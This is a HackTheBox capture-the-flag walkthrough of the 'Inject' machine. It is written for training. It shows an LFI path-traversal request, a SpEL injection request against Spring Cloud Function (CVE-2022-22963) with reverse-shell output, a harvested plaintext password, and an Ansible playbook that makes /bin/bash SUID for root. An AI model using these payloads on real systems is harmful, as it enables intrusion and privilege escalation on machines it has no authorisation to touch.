# HackTheBox — Inject

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Tags: lfi, cve, spring, ansible](https://img.shields.io/badge/Tags-LFI%20%7C%20CVE%20%7C%20Spring%20%7C%20Ansible-orange)

**Machine by [rajHere](https://app.hackthebox.com/users/396413)** · Released 2023-03-11 · Retired 2023-07-08

> **TL;DR** — A Spring Boot upload form leaks files via an LFI in `/show_image?img=`. Pull `pom.xml` to confirm a vulnerable `spring-cloud-function-web 3.2.2` (**CVE-2022-22963**), then trigger a SpEL injection RCE for a shell as `frank`. Recover `phil`'s password from a Maven `settings.xml` in `frank`'s home, `su` over for `user.txt`. Privesc via an Ansible playbook directory polled as root — drop a playbook that SUIDs `/bin/bash`.

---

## Attack Chain at a Glance

```
nmap → LFI on /show_image?img= → leak pom.xml → CVE-2022-22963 RCE
   → shell as frank → read frank's .m2/settings.xml → phil's password
   → su phil → user.txt
   → drop playbook in /opt/automation/tasks → SUID bash → root.txt
```

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Local File Inclusion](#local-file-inclusion)
- [Initial Foothold — CVE-2022-22963](#initial-foothold--cve-2022-22963)
- [User Flag — Pivoting to phil](#user-flag--pivoting-to-phil)
- [Privilege Escalation — Ansible Playbook Drop](#privilege-escalation--ansible-playbook-drop)
- [Root Flag](#root-flag)
- [Lessons Learned](#lessons-learned)
- [Tools Referenced](#tools-referenced)

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -p- --min-rate=5000 -oN nmap.txt 10.10.11.204
```

<details>
<summary>Click to expand full output</summary>

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH     | OpenSSH 8.2p1 |
| 8080 | HTTP    | Nmap mislabels this; actually a Java web app (we'll see Spring shortly) |

> 💡 **Don't trust nmap's service guess on non-standard ports.** "nagios-nsca" here is wrong — nmap inferred it from a port-only fingerprint. Always browse the page and confirm.

---

## Web Enumeration

The site on port `8080` is a small image-sharing app with two interesting endpoints:

| Endpoint | Purpose |
|----------|---------|
| `/upload` | Accepts an image upload |
| `/show_image?img=<filename>` | Renders the uploaded file |

The query parameter `img=` is the obvious thing to fuzz — it's user-controlled and clearly used as a filename.

---

## Local File Inclusion

### Confirming the Bug

```http
GET /show_image?img=../../../../../../../etc/passwd HTTP/1.1
Host: 10.10.11.204:8080
```

The response is the contents of `/etc/passwd`. Two human users stand out:

```
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

> 💡 **Trick: directory listing via the LFI.** Requesting a path that ends in `/` (e.g. `?img=../../../../home/frank/`) returns a listing of the directory rather than file contents — effectively giving us `ls` over the LFI. Useful for finding interesting files when you don't know what's there.

### Hunting Useful Files

A Spring Boot app needs a `pom.xml` somewhere. The source typically lives under `/var/www/<app>/` or `/opt/<app>/`. Trying the obvious:

```http
GET /show_image?img=../../../../../../../var/www/WebApp/pom.xml
```

Bingo. The dependency we care about:

```xml
<dependency>
    <groupId>org.springframework.cloud</groupId>
    <artifactId>spring-cloud-function-web</artifactId>
    <version>3.2.2</version>
</dependency>
```

`spring-cloud-function-web 3.2.2` is vulnerable to **[CVE-2022-22963](https://0x1.gitlab.io/exploit/SpringBoot-RCE/)** — a SpEL (Spring Expression Language) injection that yields RCE. Patched in 3.1.7 / 3.2.3.

> 📚 **Why this matters:** Spring Cloud Function lets developers expose plain Java functions as HTTP endpoints. The router accepts a `spring.cloud.function.routing-expression` header and evaluates it as SpEL — which means anything reachable from the SpEL evaluation context (including `Runtime.exec`) is reachable from any unauthenticated HTTP client.

---

## Initial Foothold — CVE-2022-22963

### Manual PoC

The minimal request to confirm the vulnerability:

```http
POST /functionRouter HTTP/1.1
Host: 10.10.11.204:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
Content-Type: text/plain
Content-Length: 4

test
```

For a reverse shell, [J0ey17's public exploit](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit/blob/main/exploit.py) wraps this neatly:

```bash
python3 exploit.py -u http://10.10.11.204:8080
```

```
[+] Target http://10.10.11.204:8080
[+] Checking if http://10.10.11.204:8080 is vulnerable to CVE-2022-22963...
[+] http://10.10.11.204:8080 is vulnerable
[/] Attempt to take a reverse shell? [y/n] y
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.204] 59098
frank@inject:/$
```

### Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl-Z, stty raw -echo; fg, export TERM=xterm
```

---

## User Flag — Pivoting to phil

`user.txt` is in `phil`'s home, not `frank`'s. We need credentials.

Spring/Maven projects often leak secrets in `~/.m2/settings.xml`, the per-user Maven config:

```bash
cat /home/frank/.m2/settings.xml
```

```xml
<settings>
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
    </server>
  </servers>
</settings>
```

The `<privateKey>` reference is a red herring — no key file actually exists. The password works on its own:

```bash
frank@inject:/$ su phil
Password: DocPhillovestoInject123

phil@inject:/$ cat ~/user.txt
```

🚩 **User flag captured.**

> 💡 **Always grep `.m2/`, `.gradle/`, `.npmrc`, `.pypirc`, and similar build-tool configs.** Developers paste credentials in there for repo authentication and forget they exist on disk in plaintext.

---

## Privilege Escalation — Ansible Playbook Drop

### Recon as phil

`sudo -l` requires a password we don't have, but `/opt` is interesting:

```bash
phil@inject:/$ ls -la /opt/automation/tasks/
-rw-r--r-- 1 root root  ...  playbook_1.yml
```

`playbook_1.yml` is an Ansible playbook, and the parent directory is writable by `phil` (or by the `staff`/`developers` group `phil` belongs to — check with `id` and `ls -la /opt/automation/tasks/`).

`pspy` (or just `ps -ef` over time) shows root periodically running `ansible-playbook` against every YAML in that directory. **That means any playbook we drop in there executes as root.**

### The Payload

Ansible playbooks are YAML. A two-task playbook that SUIDs `bash` is enough:

```bash
cat > /opt/automation/tasks/gotcha.yml <<'EOF'
- hosts: localhost
  tasks:
    - name: ROOT
      command: chmod u+s /bin/bash
      become: true
EOF
```

Or as a one-liner with `echo -e`:

```bash
echo -e "- hosts: localhost\n  tasks:\n    - name: ROOT\n      command: chmod u+s /bin/bash\n      become: true" > /opt/automation/tasks/gotcha.yml
```

> ⚠️ **Why SUID bash and not a reverse shell?** The cron interval can be a minute or more, and reverse shells via Ansible have a habit of being cleaned up by subsequent runs. SUID-ing `bash` is durable: once set, *any* shell session can promote to root with `bash -p` until a sysadmin notices.

### Wait, Then Promote

After roughly a minute:

```bash
phil@inject:/$ ls -la /bin/bash
-rwsr-xr-x 1 root root ...  /bin/bash       # note the 's'

phil@inject:/$ bash -p
bash-5.0# id
uid=1001(phil) gid=1001(phil) euid=0(root) groups=1001(phil)
```

---

## Root Flag

```bash
bash-5.0# cat /root/root.txt
```

🚩 **Root flag captured.**

---

## Lessons Learned

- **Read the build manifest.** `pom.xml`, `build.gradle`, `package.json`, `requirements.txt`, `go.mod` — every one of these is a CVE shopping list. On any Java box, `pom.xml` is the single most valuable file you can pull via LFI.
- **Trailing slashes turn LFI into directory listings.** A small but persistently useful trick when you don't yet know what files to look for.
- **Dev-tool config files leak credentials.** Maven's `settings.xml`, npm's `.npmrc`, pip's `.pypirc`, AWS's `~/.aws/credentials`, Git's `~/.gitconfig`, and SSH's `~/.ssh/config` are all worth reading on every box.
- **Watch what root is doing.** When privesc isn't obvious from `sudo -l` or SUID binaries, `pspy` reveals scheduled jobs and the directories/files they touch — those are usually the path forward.
- **Build-pipeline directories are dangerous when writable.** Ansible playbook dirs, Jenkins jobs, cron `*.d` folders, systemd unit drop-ins — anywhere a privileged process auto-loads files from a less-privileged location is an instant escalation if you can write there.
- **Don't trust nmap's service labels on non-standard ports.** "nagios-nsca" on port 8080 was wrong; the actual service was a Spring Boot app. Always confirm with a browser or `curl -i`.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port and service discovery |
| [Burp Suite](https://portswigger.net/burp) | Crafting LFI requests and inspecting responses |
| [CVE-2022-22963 writeup — 0x1.gitlab.io](https://0x1.gitlab.io/exploit/SpringBoot-RCE/) | Vulnerability background and SpEL payload mechanics |
| [J0ey17's PoC](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit/blob/main/exploit.py) | Automated CVE-2022-22963 reverse shell |
| [`pspy`](https://github.com/DominicBreuker/pspy) | Spotting the root-run Ansible loop |

---

*Thanks for reading — feedback welcome.*
